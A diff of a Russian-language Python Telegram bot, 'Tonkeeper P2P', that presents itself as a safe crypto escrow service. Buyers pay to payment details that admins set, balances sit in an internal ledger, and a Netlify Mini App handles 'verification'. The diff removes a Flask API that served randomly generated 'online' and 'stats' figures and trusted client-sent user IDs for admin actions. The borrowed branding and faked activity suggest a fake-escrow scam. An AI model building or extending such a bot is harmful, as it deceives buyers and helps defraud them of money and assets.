@@ -22,7 +22,6 @@ CHANNEL_LINK = "https://t.me/tonkeeper_news"
 
 # ССЫЛКА НА MINI APP (ВАША)
 MINI_APP_URL = "https://fantastic-melomakarona-889472.netlify.app/"
-
 # ========== ИНИЦИАЛИЗАЦИЯ ==========
 bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
 dp = Dispatcher()
@@ -90,9 +89,29 @@ def complete_verification(user_id: int):
     verification_data[uid] = {"verified_at": datetime.now().isoformat()}
     save_json(VERIFICATION_FILE, verification_data)
 
+def get_rekvisits_text(currency: str, amount: float) -> str:
+    """Безопасное получение текста реквизитов с подстановкой"""
+    curr_key = currency.lower()
+    default_text = f"Оплатите {amount} {currency} по реквизитам, указанным в Mini App"
+    
+    if curr_key in rekvisits:
+        try:
+            # Подставляем все возможные переменные
+            text = rekvisits[curr_key]
+            # Заменяем все плейсхолдеры
+            text = text.replace('{amount}', str(amount))
+            text = text.replace('{BOT_USERNAME}', BOT_USERNAME)
+            text = text.replace('{SUPPORT_LINK}', SUPPORT_LINK)
+            text = text.replace('{CHANNEL_LINK}', CHANNEL_LINK)
+            return text
+        except Exception as e:
+            print(f"Error formatting rekvisits: {e}")
+            return default_text
+    return default_text
+
 # ========== КЛАВИАТУРЫ ==========
 def main_menu_keyboard(user_id: int) -> InlineKeyboardMarkup:
-    return InlineKeyboardMarkup(inline_keyboard=[
+    buttons = [
         [
             InlineKeyboardButton(text="📱 Создать сделку", callback_data="create_deal_choice"),
             InlineKeyboardButton(text="💰 Баланс", callback_data="menu_balance"),
@@ -102,12 +121,16 @@ def main_menu_keyboard(user_id: int) -> InlineKeyboardMarkup:
             InlineKeyboardButton(text="⭐️ Отзывы", callback_data="menu_reviews"),
         ],
         [
-            InlineKeyboardButton(text="👑 Админ панель", callback_data="menu_admin"),
-        ] if is_admin(user_id) else [],
-        [
             InlineKeyboardButton(text="🔥 Открыть Mini App", web_app=WebAppInfo(url=MINI_APP_URL)),
         ]
-    ])
+    ]
+    
+    if is_admin(user_id):
+        buttons.append([
+            InlineKeyboardButton(text="👑 Админ панель", callback_data="menu_admin"),
+        ])
+    
+    return InlineKeyboardMarkup(inline_keyboard=buttons)
 
 def create_deal_choice_keyboard() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[
@@ -119,6 +142,19 @@ def create_deal_choice_keyboard() -> InlineKeyboardMarkup:
 def deal_created_keyboard(deal_id: str) -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="📋 Скопировать ссылку", callback_data=f"copy_link_{deal_id}")],
+        [InlineKeyboardButton(text="◀️ На главную", callback_data="back_to_main")]
+    ])
+
+def currency_keyboard() -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="💎 TON", callback_data="curr_TON")],
+        [InlineKeyboardButton(text="⭐️ STARS", callback_data="curr_STARS")],
+        [InlineKeyboardButton(text="💰 RUB", callback_data="curr_RUB")],
+        [InlineKeyboardButton(text="🌐 UAH", callback_data="curr_UAH")],
+    ])
+
+def back_to_main_keyboard() -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="◀️ На главную", callback_data="back_to_main")]
     ])
 
@@ -140,6 +176,20 @@ async def cmd_start(message: types.Message):
         await handle_deal_link(message, deal_id)
         return
 
+    # Проверка, есть ли язык
+    uid = str(message.from_user.id)
+    if uid not in user_language:
+        await message.answer(
+            "🌐 <b>Выберите язык / Choose language</b>\n\n"
+            "🇷🇺 Русский\n🇬🇧 English",
+            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+                [InlineKeyboardButton(text="🇷🇺 Русский", callback_data="lang_ru")],
+                [InlineKeyboardButton(text="🇬🇧 English", callback_data="lang_en")],
+            ])
+        )
+        return
+
+    lang = user_language.get(uid, "ru")
     await message.answer(
         f"🔥 <b>{BOT_NAME}</b> 🔥\n\n"
         "Безопасные P2P сделки с криптовалютой.\n"
@@ -148,37 +198,73 @@ async def cmd_start(message: types.Message):
         reply_markup=main_menu_keyboard(message.from_user.id)
     )
 
-# --- ГЛАВНОЕ МЕНЮ ---
-@dp.callback_query(lambda c: c.data == "back_to_main")
-async def back_to_main(callback: types.CallbackQuery):
+# --- ВЫБОР ЯЗЫКА ---
+@dp.callback_query(lambda c: c.data.startswith("lang_"))
+async def set_language(callback: types.CallbackQuery):
+    lang = callback.data.split("_")[1]
+    user_language[str(callback.from_user.id)] = lang
+    save_json(USER_LANGUAGE_FILE, user_language)
+    
     await callback.message.edit_text(
-        "🔥 <b>Tonkeeper P2P</b> 🔥\n\n"
+        f"✅ Язык установлен / Language set!\n\n"
+        f"🔥 <b>{BOT_NAME}</b> 🔥\n\n"
         "Выберите действие:",
         reply_markup=main_menu_keyboard(callback.from_user.id)
     )
     await callback.answer()
 
+# --- ГЛАВНОЕ МЕНЮ ---
+@dp.callback_query(lambda c: c.data == "back_to_main")
+async def back_to_main(callback: types.CallbackQuery):
+    try:
+        await callback.message.edit_text(
+            "🔥 <b>Tonkeeper P2P</b> 🔥\n\n"
+            "Выберите действие:",
+            reply_markup=main_menu_keyboard(callback.from_user.id)
+        )
+    except Exception as e:
+        # Если не удалось отредактировать - отправляем новое сообщение
+        await callback.message.answer(
+            "🔥 <b>Tonkeeper P2P</b> 🔥\n\n"
+            "Выберите действие:",
+            reply_markup=main_menu_keyboard(callback.from_user.id)
+        )
+    await callback.answer()
+
 # --- СОЗДАНИЕ СДЕЛКИ (ВЫБОР) ---
 @dp.callback_query(lambda c: c.data == "create_deal_choice")
 async def create_deal_choice(callback: types.CallbackQuery):
-    await callback.message.edit_text(
-        "📱 <b>Создать сделку</b>\n\n"
-        "Выберите способ создания:\n"
-        "• <b>Mini App</b> — удобный интерфейс с отзывами и статистикой\n"
-        "• <b>Бот</b> — быстрый текстовый режим\n\n"
-        "Какой способ предпочитаете?",
-        reply_markup=create_deal_choice_keyboard()
-    )
+    try:
+        await callback.message.edit_text(
+            "📱 <b>Создать сделку</b>\n\n"
+            "Выберите способ создания:\n"
+            "• <b>Mini App</b> — удобный интерфейс с отзывами и статистикой\n"
+            "• <b>Бот</b> — быстрый текстовый режим\n\n"
+            "Какой способ предпочитаете?",
+            reply_markup=create_deal_choice_keyboard()
+        )
+    except:
+        await callback.message.answer(
+            "📱 <b>Создать сделку</b>\n\n"
+            "Выберите способ создания:",
+            reply_markup=create_deal_choice_keyboard()
+        )
     await callback.answer()
 
 # --- СОЗДАНИЕ В БОТЕ (ШАГ 1) ---
 @dp.callback_query(lambda c: c.data == "create_deal_bot")
 async def create_deal_bot(callback: types.CallbackQuery, state: FSMContext):
-    await callback.message.edit_text(
-        "📝 <b>Создание сделки (шаг 1 из 4)</b>\n\n"
-        "Опишите товар или услугу, которую вы продаёте.\n"
-        "Пример: NFT-подарок Telegram Premium"
-    )
+    try:
+        await callback.message.edit_text(
+            "📝 <b>Создание сделки (шаг 1 из 4)</b>\n\n"
+            "Опишите товар или услугу, которую вы продаёте.\n"
+            "Пример: NFT-подарок Telegram Premium"
+        )
+    except:
+        await callback.message.answer(
+            "📝 <b>Создание сделки (шаг 1 из 4)</b>\n\n"
+            "Опишите товар или услугу, которую вы продаёте."
+        )
     await state.set_state(DealStates.waiting_product)
     await callback.answer()
 
@@ -188,12 +274,7 @@ async def get_product(message: types.Message, state: FSMContext):
     await message.answer(
         "💱 <b>Шаг 2 из 4</b>\n\n"
         "Выберите валюту сделки:",
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="💎 TON", callback_data="curr_TON")],
-            [InlineKeyboardButton(text="⭐️ STARS", callback_data="curr_STARS")],
-            [InlineKeyboardButton(text="💰 RUB", callback_data="curr_RUB")],
-            [InlineKeyboardButton(text="🌐 UAH", callback_data="curr_UAH")],
-        ])
+        reply_markup=currency_keyboard()
     )
     await state.set_state(DealStates.waiting_currency)
 
@@ -201,11 +282,17 @@ async def get_product(message: types.Message, state: FSMContext):
 async def get_currency(callback: types.CallbackQuery, state: FSMContext):
     currency = callback.data.split("_")[1]
     await state.update_data(currency=currency)
-    await callback.message.edit_text(
-        f"💰 <b>Шаг 3 из 4</b>\n\n"
-        f"Введите сумму сделки в <b>{currency}</b>:\n"
-        "Пример: 100"
-    )
+    try:
+        await callback.message.edit_text(
+            f"💰 <b>Шаг 3 из 4</b>\n\n"
+            f"Введите сумму сделки в <b>{currency}</b>:\n"
+            "Пример: 100"
+        )
+    except:
+        await callback.message.answer(
+            f"💰 <b>Шаг 3 из 4</b>\n\n"
+            f"Введите сумму сделки в <b>{currency}</b>:"
+        )
     await state.set_state(DealStates.waiting_amount)
     await callback.answer()
 
@@ -235,7 +322,7 @@ async def get_buyer(message: types.Message, state: FSMContext):
     deals[deal_id] = {
         "deal_id": deal_id,
         "seller_id": message.from_user.id,
-        "seller_username": message.from_user.username,
+        "seller_username": message.from_user.username or str(message.from_user.id),
         "buyer_username": buyer_username,
         "buyer_id": None,
         "product": data["product"],
@@ -281,7 +368,7 @@ async def handle_deal_link(message: types.Message, deal_id: str):
         await message.answer("❌ Сделка уже завершена или недоступна")
         return
 
-    if message.from_user.username.lower() != deal["buyer_username"].lower():
+    if message.from_user.username and message.from_user.username.lower() != deal["buyer_username"].lower():
         await message.answer(
             f"❌ Доступ запрещён!\n\n"
             f"Эта сделка создана для @{deal['buyer_username']}"
@@ -292,9 +379,7 @@ async def handle_deal_link(message: types.Message, deal_id: str):
     save_json(DEALS_FILE, deals)
 
     # Показываем реквизиты для оплаты
-    currency = deal["currency"].lower()
-    pay_text = rekvisits.get(currency, f"Оплатите {deal['amount']} {deal['currency']}")
-    pay_text = pay_text.format(amount=deal['amount'])
+    pay_text = get_rekvisits_text(deal["currency"], deal["amount"])
 
     await message.answer(
         f"✈️ <b>Сделка #{deal_id}</b>\n\n"
@@ -303,25 +388,45 @@ async def handle_deal_link(message: types.Message, deal_id: str):
         f"👤 Продавец: @{deal['seller_username']}\n\n"
         f"💳 <b>Реквизиты для оплаты:</b>\n"
         f"{pay_text}\n\n"
-        f"После оплаты напишите админу: /pay {deal_id}"
+        f"После оплаты напишите админу: /pay {deal_id}\n\n"
+        f"Или используйте Mini App: {MINI_APP_URL}",
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="🔥 Открыть Mini App", web_app=WebAppInfo(url=MINI_APP_URL))],
+            [InlineKeyboardButton(text="◀️ На главную", callback_data="back_to_main")]
+        ])
     )
 
 # --- БАЛАНС ---
 @dp.callback_query(lambda c: c.data == "menu_balance")
 async def menu_balance(callback: types.CallbackQuery):
     bal = get_balance(callback.from_user.id)
-    await callback.message.edit_text(
+    text = (
         f"💰 <b>Ваш баланс</b>\n\n"
         f"💎 TON: {bal.get('ton', 0)}\n"
         f"⭐️ STARS: {bal.get('stars', 0)}\n"
         f"💰 RUB: {bal.get('rub', 0)}\n"
         f"🌐 UAH: {bal.get('uah', 0)}\n\n"
-        f"📊 Сделок завершено: {sum(bal.get('deal_partners', {}).values())}",
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="💲 Вывести средства", callback_data="withdraw_start")],
-            [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
-        ])
+        f"📊 Сделок завершено: {sum(bal.get('deal_partners', {}).values())}"
     )
+    
+    try:
+        await callback.message.edit_text(
+            text,
+            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+                [InlineKeyboardButton(text="💲 Вывести средства", callback_data="withdraw_start")],
+                [InlineKeyboardButton(text="🔥 Открыть Mini App", web_app=WebAppInfo(url=MINI_APP_URL))],
+                [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
+            ])
+        )
+    except:
+        await callback.message.answer(
+            text,
+            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+                [InlineKeyboardButton(text="💲 Вывести средства", callback_data="withdraw_start")],
+                [InlineKeyboardButton(text="🔥 Открыть Mini App", web_app=WebAppInfo(url=MINI_APP_URL))],
+                [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
+            ])
+        )
     await callback.answer()
 
 # --- МОИ СДЕЛКИ ---
@@ -333,12 +438,16 @@ async def menu_deals(callback: types.CallbackQuery):
             user_deals.append((d_id, d))
 
     if not user_deals:
-        await callback.message.edit_text(
-            "📭 У вас нет сделок",
-            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-                [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
-            ])
-        )
+        try:
+            await callback.message.edit_text(
+                "📭 У вас нет сделок",
+                reply_markup=back_to_main_keyboard()
+            )
+        except:
+            await callback.message.answer(
+                "📭 У вас нет сделок",
+                reply_markup=back_to_main_keyboard()
+            )
         return
 
     text = "📊 <b>Ваши сделки</b>\n\n"
@@ -352,40 +461,55 @@ async def menu_deals(callback: types.CallbackQuery):
         text += f"#{d_id} | {status} | {d['amount']} {d['currency']}\n"
         text += f"   → {d['product'][:30]}\n\n"
 
-    await callback.message.edit_text(
-        text,
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
-        ])
-    )
+    try:
+        await callback.message.edit_text(
+            text,
+            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+                [InlineKeyboardButton(text="🔥 Открыть Mini App", web_app=WebAppInfo(url=MINI_APP_URL))],
+                [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
+            ])
+        )
+    except:
+        await callback.message.answer(
+            text,
+            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+                [InlineKeyboardButton(text="🔥 Открыть Mini App", web_app=WebAppInfo(url=MINI_APP_URL))],
+                [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
+            ])
+        )
     await callback.answer()
 
 # --- ОТЗЫВЫ ---
 @dp.callback_query(lambda c: c.data == "menu_reviews")
 async def menu_reviews(callback: types.CallbackQuery):
     reviews_list = list(reviews.values())[-20:]
+    
     if not reviews_list:
+        text = "⭐️ <b>Отзывы</b>\n\nПока нет отзывов. Будьте первым!"
+    else:
+        text = "⭐️ <b>Последние отзывы</b>\n\n"
+        for r in reviews_list[-5:]:
+            text += f"👤 {r.get('user', 'Аноним')} | {'⭐' * r.get('rating', 5)}\n"
+            text += f"📝 {r.get('text', '')[:100]}\n\n"
+    
+    try:
         await callback.message.edit_text(
-            "⭐️ <b>Отзывы</b>\n\nПока нет отзывов. Будьте первым!",
+            text,
             reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                 [InlineKeyboardButton(text="📝 Написать отзыв", callback_data="write_review")],
+                [InlineKeyboardButton(text="🔥 Открыть Mini App", web_app=WebAppInfo(url=MINI_APP_URL))],
                 [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
             ])
         )
-        return
-
-    text = "⭐️ <b>Последние отзывы</b>\n\n"
-    for r in reviews_list[-5:]:
-        text += f"👤 {r.get('user', 'Аноним')} | {'⭐' * r.get('rating', 5)}\n"
-        text += f"📝 {r.get('text', '')[:100]}\n\n"
-
-    await callback.message.edit_text(
-        text,
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="📝 Написать отзыв", callback_data="write_review")],
-            [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
-        ])
-    )
+    except:
+        await callback.message.answer(
+            text,
+            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+                [InlineKeyboardButton(text="📝 Написать отзыв", callback_data="write_review")],
+                [InlineKeyboardButton(text="🔥 Открыть Mini App", web_app=WebAppInfo(url=MINI_APP_URL))],
+                [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
+            ])
+        )
     await callback.answer()
 
 # --- НАПИСАНИЕ ОТЗЫВА ---
@@ -395,7 +519,7 @@ async def write_review(callback: types.CallbackQuery):
     if not is_verified(callback.from_user.id):
         await callback.message.edit_text(
             "⚠️ <b>Для написания отзыва необходима верификация!</b>\n\n"
-            "Пройдите проверку в Mini App: 🔥 Открыть Mini App",
+            "Пройдите проверку в Mini App:",
             reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                 [InlineKeyboardButton(text="🔥 Открыть Mini App", web_app=WebAppInfo(url=MINI_APP_URL))],
                 [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
@@ -495,350 +619,116 @@ async def menu_admin(callback: types.CallbackQuery):
     )
     await callback.answer()
 
-# ========== API ЭНДПОИНТЫ ДЛЯ MINI APP ==========
-# Эти эндпоинты будут обрабатывать запросы от Mini App
+# --- КОМАНДА /PAY (ДЛЯ АДМИНА) ---
+@dp.message(Command("pay"))
+async def pay_command(message: types.Message):
+    if not is_admin(message.from_user.id):
+        await message.answer("⛔ Доступ запрещён")
+        return
 
-from flask import Flask, request, jsonify
-import threading
+    args = message.text.split()
+    if len(args) != 2:
+        await message.answer("❗️ Использование: /pay [ID сделки]")
+        return
 
-app = Flask(__name__)
+    deal_id = args[1]
+    if deal_id not in deals:
+        await message.answer("❌ Сделка не найдена")
+        return
 
-@app.route('/api/balance', methods=['POST'])
-def api_balance():
-    data = request.json
-    user_id = data.get('user_id')
-    if not user_id:
-        return jsonify({'success': False, 'error': 'user_id required'})
-    bal = get_balance(user_id)
-    return jsonify({'success': True, 'balance': bal})
+    deal = deals[deal_id]
+    if deal["status"] != "waiting_payment":
+        await message.answer("❌ Сделка уже обработана")
+        return
 
-@app.route('/api/deals', methods=['POST'])
-def api_deals():
-    data = request.json
-    user_id = data.get('user_id')
-    if not user_id:
-        return jsonify({'success': False, 'error': 'user_id required'})
-
-    user_deals = []
-    for d_id, d in deals.items():
-        if d.get('seller_id') == user_id:
-            user_deals.append(d)
-    return jsonify({'success': True, 'deals': user_deals})
-
-@app.route('/api/create_deal', methods=['POST'])
-def api_create_deal():
-    data = request.json
-    user_id = data.get('user_id')
-    username = data.get('username')
-    product = data.get('product')
-    currency = data.get('currency')
-    amount = data.get('amount')
-    buyer_username = data.get('buyer_username')
-
-    if not all([user_id, product, currency, amount, buyer_username]):
-        return jsonify({'success': False, 'error': 'Missing fields'})
-
-    deal_id = str(uuid.uuid4())[:8]
-    deals[deal_id] = {
-        "deal_id": deal_id,
-        "seller_id": user_id,
-        "seller_username": username,
-        "buyer_username": buyer_username.lower(),
-        "buyer_id": None,
-        "product": product,
-        "currency": currency,
-        "amount": float(amount),
-        "status": "waiting_payment",
-        "created_at": datetime.now().isoformat(),
-        "paid_by_admin": None,
-        "completed_at": None
-    }
+    deal["status"] = "paid"
+    deal["paid_by_admin"] = message.from_user.id
     save_json(DEALS_FILE, deals)
 
-    link = f"https://t.me/{BOT_USERNAME}?start=deal_{deal_id}"
+    await message.answer(f"✅ Оплата подтверждена для сделки #{deal_id}")
 
-    return jsonify({
-        'success': True,
-        'deal_id': deal_id,
-        'link': link
-    })
+    # Уведомляем продавца
+    try:
+        await bot.send_message(
+            deal["seller_id"],
+            f"💎 <b>Сделка #{deal_id} оплачена!</b>\n\n"
+            f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
+            f"👤 Покупатель: @{deal['buyer_username']}\n\n"
+            f"Нажмите <b>«Передал товар»</b> в Mini App или боте",
+            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+                [InlineKeyboardButton(text="📦 Передал товар", callback_data=f"seller_done_{deal_id}")],
+                [InlineKeyboardButton(text="🔥 Открыть Mini App", web_app=WebAppInfo(url=MINI_APP_URL))]
+            ])
+        )
+    except Exception as e:
+        print(f"Error notifying seller: {e}")
 
-@app.route('/api/withdraw', methods=['POST'])
-def api_withdraw():
-    data = request.json
-    user_id = data.get('user_id')
-    currency = data.get('currency')
-    details = data.get('details')
+# --- ПОДТВЕРЖДЕНИЕ ПЕРЕДАЧИ ТОВАРА (ПРОДАВЕЦ) ---
+@dp.callback_query(lambda c: c.data.startswith("seller_done_"))
+async def seller_done(callback: types.CallbackQuery):
+    deal_id = callback.data.split("_")[2]
+    if deal_id not in deals:
+        await callback.answer("❌ Сделка не найдена")
+        return
 
-    if not all([user_id, currency, details]):
-        return jsonify({'success': False, 'error': 'Missing fields'})
+    deal = deals[deal_id]
+    if deal["status"] != "paid":
+        await callback.answer("⏳ Сначала оплата должна быть подтверждена")
+        return
 
-    bal = get_balance(user_id)
-    curr_key = currency.lower()
-    if bal.get(curr_key, 0) <= 0:
-        return jsonify({'success': False, 'error': 'Insufficient balance'})
+    deal["status"] = "awaiting_confirmation"
+    save_json(DEALS_FILE, deals)
 
-    request_id = str(uuid.uuid4())[:8]
-    withdraw_requests[request_id] = {
-        "id": request_id,
-        "user_id": user_id,
-        "username": str(user_id),
-        "currency": currency,
-        "amount": bal[curr_key],
-        "details": details,
-        "status": "pending",
-        "created_at": datetime.now().isoformat()
-    }
-    save_json(WITHDRAW_REQUESTS_FILE, withdraw_requests)
+    await callback.message.edit_text(
+        f"✅ Вы подтвердили передачу товара по сделке #{deal_id}\n\n"
+        f"Ожидайте подтверждения от покупателя"
+    )
+    await callback.answer()
 
-    return jsonify({'success': True, 'request_id': request_id})
+# --- ПОДТВЕРЖДЕНИЕ ПОЛУЧЕНИЯ (ПОКУПАТЕЛЬ) ---
+@dp.callback_query(lambda c: c.data.startswith("buyer_confirm_"))
+async def buyer_confirm(callback: types.CallbackQuery):
+    deal_id = callback.data.split("_")[2]
+    if deal_id not in deals:
+        await callback.answer("❌ Сделка не найдена")
+        return
 
-@app.route('/api/reviews', methods=['POST'])
-def api_reviews():
-    data = request.json
-    limit = data.get('limit', 10)
-    page = data.get('page', 0)
+    deal = deals[deal_id]
+    if deal["status"] != "awaiting_confirmation":
+        await callback.answer("⏳ Сделка не в статусе ожидания подтверждения")
+        return
 
-    reviews_list = list(reviews.values())
-    start = page * limit
-    end = start + limit
-    paginated = reviews_list[start:end]
+    # Зачисляем средства продавцу
+    add_balance(deal["seller_id"], deal["currency"], deal["amount"])
+    
+    # Обновляем статистику партнёров
+    seller_balance = get_balance(deal["seller_id"])
+    buyer = deal["buyer_username"]
+    if buyer not in seller_balance["deal_partners"]:
+        seller_balance["deal_partners"][buyer] = 0
+    seller_balance["deal_partners"][buyer] += 1
+    save_json(BALANCE_FILE, balance)
 
-    return jsonify({
-        'success': True,
-        'reviews': paginated,
-        'total': len(reviews_list)
-    })
+    deal["status"] = "completed"
+    deal["completed_at"] = datetime.now().isoformat()
+    save_json(DEALS_FILE, deals)
 
-@app.route('/api/add_review', methods=['POST'])
-def api_add_review():
-    data = request.json
-    user_id = data.get('user_id')
-    rating = data.get('rating')
-    text = data.get('text')
-    anonymous = data.get('anonymous', True)
+    await callback.message.edit_text(
+        f"🎉 <b>Сделка #{deal_id} завершена!</b>\n\n"
+        f"💳 {deal['amount']} {deal['currency']} зачислены на баланс продавца\n\n"
+        f"Спасибо за использование {BOT_NAME}!",
+        reply_markup=back_to_main_keyboard()
+    )
+    await callback.answer()
 
-    if not all([user_id, rating, text]):
-        return jsonify({'success': False, 'error': 'Missing fields'})
-
-    # Проверка верификации
-    if not is_verified(user_id):
-        return jsonify({'success': False, 'error': 'Verification required'})
-
-    # Проверка сделок
-    user_deals = [d for d in deals.values() if d.get('seller_id') == user_id and d.get('status') == 'completed']
-    if len(user_deals) < 1:
-        return jsonify({'success': False, 'error': 'Need at least 1 completed deal'})
-
-    review_id = str(uuid.uuid4())[:8]
-    reviews[review_id] = {
-        "id": review_id,
-        "user": "Аноним" if anonymous else str(user_id),
-        "rating": rating,
-        "text": text,
-        "anonymous": anonymous,
-        "date": datetime.now().strftime("%d.%m.%Y %H:%M"),
-        "user_id": user_id
-    }
-    save_json(REVIEWS_FILE, reviews)
-
-    return jsonify({'success': True, 'review_id': review_id})
-
-@app.route('/api/delete_review', methods=['POST'])
-def api_delete_review():
-    data = request.json
-    user_id = data.get('user_id')
-    review_id = data.get('review_id')
-
-    if not is_admin(user_id):
-        return jsonify({'success': False, 'error': 'Admin required'})
-
-    if review_id in reviews:
-        del reviews[review_id]
-        save_json(REVIEWS_FILE, reviews)
-        return jsonify({'success': True})
-
-    return jsonify({'success': False, 'error': 'Review not found'})
-
-@app.route('/api/clear_reviews', methods=['POST'])
-def api_clear_reviews():
-    data = request.json
-    user_id = data.get('user_id')
-
-    if not is_admin(user_id):
-        return jsonify({'success': False, 'error': 'Admin required'})
-
-    reviews.clear()
-    save_json(REVIEWS_FILE, reviews)
-    return jsonify({'success': True})
-
-@app.route('/api/is_admin', methods=['POST'])
-def api_is_admin():
-    data = request.json
-    user_id = data.get('user_id')
-    return jsonify({'success': True, 'is_admin': is_admin(user_id)})
-
-@app.route('/api/check_verification', methods=['POST'])
-def api_check_verification():
-    data = request.json
-    user_id = data.get('user_id')
-    return jsonify({'success': True, 'verified': is_verified(user_id)})
-
-@app.route('/api/check_deals', methods=['POST'])
-def api_check_deals():
-    data = request.json
-    user_id = data.get('user_id')
-    user_deals = [d for d in deals.values() if d.get('seller_id') == user_id and d.get('status') == 'completed']
-    return jsonify({'success': True, 'hasDeals': len(user_deals) >= 1})
-
-@app.route('/api/withdraw_requests', methods=['POST'])
-def api_withdraw_requests():
-    data = request.json
-    user_id = data.get('user_id')
-
-    if not is_admin(user_id):
-        return jsonify({'success': False, 'error': 'Admin required'})
-
-    pending = [r for r in withdraw_requests.values() if r.get('status') == 'pending']
-    return jsonify({'success': True, 'requests': pending})
-
-@app.route('/api/confirm_withdraw', methods=['POST'])
-def api_confirm_withdraw():
-    data = request.json
-    user_id = data.get('user_id')
-    request_id = data.get('request_id')
-
-    if not is_admin(user_id):
-        return jsonify({'success': False, 'error': 'Admin required'})
-
-    if request_id not in withdraw_requests:
-        return jsonify({'success': False, 'error': 'Request not found'})
-
-    req = withdraw_requests[request_id]
-    if req.get('status') != 'pending':
-        return jsonify({'success': False, 'error': 'Already processed'})
-
-    # Списываем баланс
-    bal = get_balance(req['user_id'])
-    curr_key = req['currency'].lower()
-    if bal.get(curr_key, 0) >= req['amount']:
-        bal[curr_key] -= req['amount']
-        save_json(BALANCE_FILE, balance)
-
-    req['status'] = 'completed'
-    req['completed_at'] = datetime.now().isoformat()
-    save_json(WITHDRAW_REQUESTS_FILE, withdraw_requests)
-
-    return jsonify({'success': True})
-
-@app.route('/api/reject_withdraw', methods=['POST'])
-def api_reject_withdraw():
-    data = request.json
-    user_id = data.get('user_id')
-    request_id = data.get('request_id')
-
-    if not is_admin(user_id):
-        return jsonify({'success': False, 'error': 'Admin required'})
-
-    if request_id not in withdraw_requests:
-        return jsonify({'success': False, 'error': 'Request not found'})
-
-    withdraw_requests[request_id]['status'] = 'rejected'
-    save_json(WITHDRAW_REQUESTS_FILE, withdraw_requests)
-
-    return jsonify({'success': True})
-
-@app.route('/api/add_balance', methods=['POST'])
-def api_add_balance():
-    data = request.json
-    user_id = data.get('user_id')
-    target_user_id = data.get('target_user_id')
-    currency = data.get('currency')
-    amount = data.get('amount')
-
-    if not is_admin(user_id):
-        return jsonify({'success': False, 'error': 'Admin required'})
-
-    add_balance(target_user_id, currency, amount)
-    return jsonify({'success': True})
-
-@app.route('/api/manage_admin', methods=['POST'])
-def api_manage_admin():
-    data = request.json
-    user_id = data.get('user_id')
-    target_user_id = data.get('target_user_id')
-    action = data.get('action')
-
-    if user_id != MASTER_ADMIN_ID:
-        return jsonify({'success': False, 'error': 'Master admin only'})
-
-    if action == 'add':
-        admins[str(target_user_id)] = True
-    elif action == 'remove':
-        if str(target_user_id) in admins:
-            del admins[str(target_user_id)]
-    else:
-        return jsonify({'success': False, 'error': 'Invalid action'})
-
-    save_json(ADMINS_FILE, admins)
-    return jsonify({'success': True})
-
-@app.route('/api/edit_rekvisits', methods=['POST'])
-def api_edit_rekvisits():
-    data = request.json
-    user_id = data.get('user_id')
-    currency = data.get('currency')
-    text = data.get('text')
-
-    if not is_admin(user_id):
-        return jsonify({'success': False, 'error': 'Admin required'})
-
-    rekvisits[currency.lower()] = text
-    save_json(REKVISITS_FILE, rekvisits)
-    return jsonify({'success': True})
-
-@app.route('/api/all_deals', methods=['POST'])
-def api_all_deals():
-    data = request.json
-    user_id = data.get('user_id')
-
-    if not is_admin(user_id):
-        return jsonify({'success': False, 'error': 'Admin required'})
-
-    return jsonify({'success': True, 'deals': list(deals.values())})
-
-@app.route('/api/online', methods=['GET'])
-def api_online():
-    # Симуляция онлайн-счётчика
-    import random
-    return jsonify({'online': random.randint(30, 200)})
-
-@app.route('/api/stats', methods=['GET'])
-def api_stats():
-    import random
-    return jsonify({
-        'deals_today': random.randint(10, 50),
-        'users': random.randint(1000, 3000),
-        'reviews': len(reviews),
-        'volume': round(20 + random.random() * 80, 1)
-    })
-
-# ========== ЗАПУСК ФЛАСКА В ОТДЕЛЬНОМ ПОТОКЕ ==========
-def run_flask():
-    app.run(host='0.0.0.0', port=8080)
-
-# ========== ОСНОВНОЙ ЗАПУСК ==========
+# ========== ЗАПУСК ==========
 async def main():
     print("🔥 Tonkeeper P2P Бот запущен")
     print(f"👑 Мастер-админ: {MASTER_ADMIN_ID}")
     print(f"📱 Mini App URL: {MINI_APP_URL}")
     print(f"🤖 Бот: @{BOT_USERNAME}")
+    print("✅ Бот готов к работе!")
 
-    # Запускаем Flask API в отдельном потоке
-    threading.Thread(target=run_flask, daemon=True).start()
-    print("✅ Flask API запущен на порту 8080")
-
-    # Запускаем бота
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
